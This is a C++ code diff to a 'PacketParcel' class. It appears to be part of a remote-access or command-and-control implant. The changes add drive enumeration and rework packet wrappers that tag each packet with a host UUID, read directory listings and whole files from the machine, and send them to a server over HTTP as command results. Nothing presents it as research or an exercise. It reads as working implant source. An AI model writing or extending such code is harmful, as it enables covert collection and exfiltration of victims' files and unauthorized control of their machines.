@@ -64,7 +64,52 @@ int PacketParcel::online(char ** data,int * datasize) {
 	return ret;
 }
 
-int PacketParcel::dirWrapper(const char* path, char** data, int* datasize) {
+
+int PacketParcel::driveWrapper(char* subdata, int subsize, char** data,int* datasize) {
+	int ret = 0;
+	if (data == 0)
+	{
+		return FALSE;
+	}
+
+	char drivers[128];
+	int drivers_len = getDrivers(drivers, sizeof(drivers));
+
+	if (*data == 0) {
+		*data = new char[drivers_len + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG) + sizeof(MY_CMD_PACKET) + 16];
+	}
+
+	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
+	hdr->tag = DATA_PACK_TAG;
+	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));
+
+	int uuid_len = g_uuid_len;
+	hdr->hdr.hostname_len = uuid_len;
+	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);
+
+	hdr->hdr.hostname2_len = subsize;
+	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);
+
+	int offset = sizeof(PACKET_HEADER);
+
+	MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(*data + offset);
+	inpack->type = MISSION_TYPE_DRIVE;
+	inpack->len = drivers_len;
+	offset += sizeof(MY_CMD_PACKET);
+	memcpy(inpack->value, drivers, drivers_len);
+
+	offset += drivers_len;
+
+	*(DWORD*)(*data + offset) = DATA_PACK_TAG;
+	offset += sizeof(DATA_PACK_TAG);
+
+	*datasize = offset;
+
+	return offset;
+}
+
+
+int PacketParcel::dirWrapper(const char* path, char* subdata, int subsize, char** data, int* datasize) {
 	int ret = 0;
 	if (data == 0)
 	{
@@ -84,11 +129,14 @@ int PacketParcel::dirWrapper(const char* path, char** data, int* datasize) {
 
 	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
 	hdr->tag = DATA_PACK_TAG;
-	memcpy(hdr->cmd, CMD_CREATE_FILE, sizeof(hdr->cmd));
+	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));
 
 	int uuid_len = g_uuid_len;
-	hdr->hostname_len = uuid_len;
-	memcpy(hdr->hostname, g_uuid, uuid_len);
+	hdr->hdr.hostname_len = uuid_len;
+	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);
+
+	hdr->hdr.hostname2_len = subsize;
+	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);
 
 	int offset = sizeof(PACKET_HEADER);
 
@@ -122,7 +170,7 @@ int PacketParcel::dirWrapper(const char* path, char** data, int* datasize) {
 }
 
 
-int PacketParcel::fileWrapper(const char* filename, char** data, int* datasize) {
+int PacketParcel::fileWrapper(const char* filename, char * subdata,int subsize,char** data, int* datasize) {
 	int ret = 0;
 	if (data == 0)
 	{
@@ -131,7 +179,8 @@ int PacketParcel::fileWrapper(const char* filename, char** data, int* datasize) 
 	int b_file_data = 0;
 	DWORD sizehigh = 0;
 	int filesize = 0;
-	HANDLE hf = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	HANDLE hf = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, 
+		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	if (hf == INVALID_HANDLE_VALUE)
 	{
 		ret = GetLastError();
@@ -154,11 +203,14 @@ int PacketParcel::fileWrapper(const char* filename, char** data, int* datasize) 
 
 	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
 	hdr->tag = DATA_PACK_TAG;
-	memcpy(hdr->cmd, CMD_CREATE_FILE, sizeof(hdr->cmd));
+	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));
 
 	int uuid_len = g_uuid_len;
-	hdr->hostname_len = uuid_len;
-	memcpy(hdr->hostname, g_uuid, uuid_len);
+	hdr->hdr.hostname_len = uuid_len;
+	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);
+
+	hdr->hdr.hostname2_len = subsize;
+	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);
 
 	int offset = sizeof(PACKET_HEADER);
 
@@ -202,14 +254,18 @@ int PacketParcel::cmdWrapper(char * data,int size,const char * cmd,char **out,in
 		*out = new char[bufsize];
 	}
 	PACKET_HEADER* hdr = (PACKET_HEADER*)(*out);
+	memset(hdr, 0, sizeof(PACKET_HEADER));
 	hdr->tag = DATA_PACK_TAG;
-	memcpy(hdr->cmd, cmd, sizeof(hdr->cmd));
+	memcpy(hdr->hdr.cmd, cmd, sizeof(hdr->hdr.cmd));
 
-	int uuid_len = g_uuid_len;
-	hdr->hostname_len = uuid_len;
-	memcpy(hdr->hostname, g_uuid, uuid_len);
+	hdr->hdr.hostname_len = g_uuid_len;
+	memcpy(hdr->hdr.hostname, g_uuid, g_uuid_len);
 
 	int offset = sizeof(PACKET_HEADER);
+	if (cmd == CMD_ONLINE)
+	{
+		offset = offset - g_uuid_len - 1;
+	}
 
 	if (data && size)
 	{
@@ -226,7 +282,7 @@ int PacketParcel::cmdWrapper(char * data,int size,const char * cmd,char **out,in
 }
 
 
-int PacketParcel::cmdWrapper(char* data, int size, const char* cmd, const char * subcmd,char** out, int* outisize) {
+int PacketParcel::cmdWrapper(const char* cmd, const char * subcmd,char** out, int* outisize) {
 	if (out == 0)
 	{
 		return FALSE;
@@ -234,7 +290,7 @@ int PacketParcel::cmdWrapper(char* data, int size, const char* cmd, const char *
 
 	if (*out == 0)
 	{
-		int bufsize = size + sizeof(ALLHOSTS_HEADER) + sizeof(DATA_PACK_TAG);
+		int bufsize =  sizeof(ALLHOSTS_HEADER) + sizeof(DATA_PACK_TAG);
 		*out = new char[bufsize];
 	}
 	ALLHOSTS_HEADER* hdr = (ALLHOSTS_HEADER*)(*out);
@@ -244,12 +300,6 @@ int PacketParcel::cmdWrapper(char* data, int size, const char* cmd, const char *
 	memcpy(hdr->subcmd, subcmd, sizeof(hdr->subcmd));
 
 	int offset = sizeof(ALLHOSTS_HEADER);
-
-	if (data && size)
-	{
-		memcpy(*out + offset, data, size);
-		offset += size;
-	}
 
 	*outisize = offset;
 
@@ -267,11 +317,11 @@ int PacketParcel::cmdDataWrapper(char* data, int size, const char* cmd, const ch
 
 	if (*out == 0)
 	{
-		int bufsize = size + sizeof(PACKET_DATA_HEADER) + sizeof(DATA_PACK_TAG) + subsize;
+		int bufsize = size + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG) + subsize;
 		*out = new char[bufsize];
 	}
-	PACKET_DATA_HEADER* pack = (PACKET_DATA_HEADER*)(*out);
-	pack->hdr.tag = DATA_PACK_TAG;
+	PACKET_HEADER* pack = (PACKET_HEADER*)(*out);
+	pack->tag = DATA_PACK_TAG;
 
 	memcpy(pack->hdr.cmd, cmd, sizeof(pack->hdr.cmd));
 
@@ -279,10 +329,10 @@ int PacketParcel::cmdDataWrapper(char* data, int size, const char* cmd, const ch
 	pack->hdr.hostname_len = uuid_len;
 	memcpy(pack->hdr.hostname, g_uuid, uuid_len);
 
-	pack->filename_len = subsize;
-	memcpy((char*)pack->filename, subdata,subsize);
+	pack->hdr.hostname2_len = subsize;
+	memcpy((char*)pack->hdr.hostname2, subdata,subsize);
 
-	int offset = sizeof(PACKET_DATA_HEADER) + subsize;
+	int offset = sizeof(PACKET_HEADER) + subsize;
 
 	if (data && size)
 	{
@@ -332,7 +382,7 @@ bool PacketParcel::postAllCmd(const char* cmd, const char* subcmd) {
 	int datasize = 0;
 	int ret = 0;
 
-	ret = cmdWrapper(0, 0, cmd, subcmd, &data, &datasize);
+	ret = cmdWrapper( cmd, subcmd, &data, &datasize);
 	if (ret)
 	{
 		ret = m_protocol->httpRequest(data, datasize);
@@ -376,24 +426,29 @@ bool PacketParcel::postCmdFile(const char* cmd, const char* data, int datasize) 
 
 
 
-bool PacketParcel::postFile(string filename,int type) {
+bool PacketParcel::postFile(string filename,int type,char * subdata,int subsize) {
 
 	char* data = 0;
 	int datasize = 0;
 	int ret = 0;
 
-	ret = PathIsDirectoryA(filename.c_str());
-
-	if ( (ret & FILE_ATTRIBUTE_DIRECTORY))
+	if (type == MISSION_TYPE_DRIVE)
 	{
-		ret = dirWrapper(filename.c_str(), &data, &datasize);
-	}
-	else if ( (ret & FILE_ATTRIBUTE_ARCHIVE) )
-	{
-		ret = fileWrapper(filename.c_str(), &data, &datasize);
+		ret = driveWrapper( subdata, subsize, &data, &datasize);
 	}
 	else {
-		ret = fileWrapper(filename.c_str(), &data, &datasize);
+		ret = PathIsDirectoryA(filename.c_str());
+		if ((ret & FILE_ATTRIBUTE_DIRECTORY))
+		{
+			ret = dirWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
+		}
+		else if ((ret & FILE_ATTRIBUTE_ARCHIVE))
+		{
+			ret = fileWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
+		}
+		else {
+			ret = fileWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
+		}
 	}
 
 	if (ret)
